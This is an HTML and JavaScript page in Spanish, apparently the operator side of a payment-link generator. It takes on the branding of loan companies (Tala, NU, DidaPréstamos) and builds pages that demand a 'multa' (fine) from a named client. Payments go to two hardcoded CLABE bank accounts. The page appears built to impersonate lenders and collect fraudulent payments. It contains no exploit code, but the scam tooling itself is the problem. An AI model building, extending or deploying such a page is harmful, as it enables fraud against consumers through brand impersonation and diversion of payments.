<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Generador de Ligas</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { 
            font-family: 'Inter', sans-serif; 
            margin: 0; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh;
            background: #0b1120;
            /* EL FONDO ANIMADO QUE TENÍAS */
            background-image: url('https://consulta-multasapp.vercel.app/_next/static/media/bg-desktop.8463878b.jpg'); 
            background-size: cover;
            background-position: center;
        }
        .main-container {
            width: 100%;
            max-width: 440px;
            background: white;
            border-radius: 2.5rem;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .header-section { padding-top: 2.5rem; padding-bottom: 1.5rem; text-align: center; }
        .monto-card { 
            background: rgba(0, 0, 0, 0.1); 
            margin: 0 1.5rem; 
            padding: 1.5rem; 
            border-radius: 1.5rem; 
            text-align: left;
        }
        input[type="number"]::-webkit-inner-spin-button, 
        input[type="number"]::-webkit-outer-spin-button { -webkit-appearance: none; margin: 0; }
    </style>
</head>
<body>
    <div class="main-container">
        <div id="header-bg" class="bg-[#14b8a6] header-section">
            <div class="w-20 h-20 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white/20">
                <img id="app-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
            </div>
            <div class="px-6 mb-4">
                <select id="product-select" onchange="updateApp()" class="w-full bg-white/20 text-white border-none rounded-xl px-4 py-2 font-bold text-center outline-none">
                    <option value="tala|#14b8a6|#0d9488">Tala Préstamos</option>
                    <option value="nu|#820ad1|#581c87">Préstamos NU</option>
                    <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
                </select>
            </div>
            <div id="monto-card-bg" class="monto-card bg-[#0d9488] text-white">
                <span class="text-[10px] font-bold opacity-80 uppercase">Monto de Pago</span>
                <div class="flex items-center">
                    <span class="text-3xl font-bold mr-1">$</span>
                    <input type="number" id="input-monto" placeholder="0.00" class="bg-transparent border-none outline-none text-3xl font-bold w-full text-white placeholder:text-white/50">
                </div>
            </div>
        </div>

        <div class="p-6 space-y-4">
            <div class="flex justify-between items-center text-sm border-b border-gray-100 pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Subproducto</span>
                <span class="font-bold">Multa</span>
            </div>
            <div class="flex justify-between items-center text-sm border-b border-gray-100 pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Importe</span>
                <span class="font-bold" id="label-importe">$0.00</span>
            </div>
            <div class="flex justify-between items-center text-sm border-b border-gray-100 pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Fecha Vencimiento</span>
                <input type="date" id="f-venc" class="font-bold outline-none text-right">
            </div>
            <div class="flex justify-between items-center text-sm border-b border-gray-100 pb-2">
                <span class="text-gray-400 font-bold uppercase text-[10px]">Días Vencimiento</span>
                <span class="font-bold">0</span>
            </div>

            <div class="bg-gray-50 rounded-[2rem] p-4 space-y-3 border border-gray-100">
                <div class="text-center text-[9px] font-bold text-gray-400 uppercase mb-1">Método de Pago</div>
                <select id="metodo-pago" onchange="cambiarCuenta()" class="w-full bg-white border border-gray-200 rounded-xl py-2 text-sm font-bold text-center outline-none">
                    <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
                    <option value="BBVA">BBVA</option>
                </select>
                <div class="text-center text-[9px] font-bold text-gray-400 uppercase mb-1">Liga de Pago</div>
                <select id="clabe-pago" class="w-full bg-white border border-gray-200 rounded-xl py-2 text-sm font-bold text-center text-blue-600 outline-none">
                    <option value="703010052250010635">703010052250010635</option>
                </select>
            </div>

            <div class="space-y-3">
                <input type="text" id="cliente-nombre" placeholder="Nombre del cliente" class="w-full border-b border-gray-200 py-2 text-sm font-bold outline-none text-center">
                <input type="text" id="cliente-tel" placeholder="Teléfono" class="w-full border-b border-gray-200 py-2 text-sm font-bold outline-none text-center">
            </div>

            <button onclick="confirmar()" id="btn-main" class="w-full bg-[#0d9488] text-white font-bold py-4 rounded-2xl uppercase text-xs tracking-widest mt-2">GENERAR LINK</button>
        </div>
    </div>

    <script>
        // Sincronizar el label de importe con el input
        document.getElementById('input-monto').addEventListener('input', (e) => {
            document.getElementById('label-importe').innerText = e.target.value ? '$' + e.target.value : '$0.00';
        });

        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];

        function cambiarCuenta() {
            const m = document.getElementById('metodo-pago').value;
            const c = document.getElementById('clabe-pago');
            c.innerHTML = "";
            let num = (m === "MERCADO PAGO W SPEI") ? "703010052250010635" : "012180015094579916";
            c.add(new Option(num, num));
        }

        function confirmar() {
            const params = new URLSearchParams({
                monto: document.getElementById('input-monto').value || "0.00",
                nombre: document.getElementById('cliente-nombre').value || "Cliente",
                fecha: document.getElementById('f-venc').value,
                prod: document.getElementById('product-select').options[document.getElementById('product-select').selectedIndex].text,
                clabe: document.getElementById('clabe-pago').value,
                banco: document.getElementById('metodo-pago').value,
                start: Date.now() // Persistencia de tiempo
            });
            window.location.href = `detalle.html?${params.toString()}`;
        }

        function updateApp() {
            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
            document.getElementById('header-bg').style.backgroundColor = c1;
            document.getElementById('monto-card-bg').style.backgroundColor = c2;
            document.getElementById('btn-main').style.backgroundColor = c2;
        }
    </script>
</body>
</html>
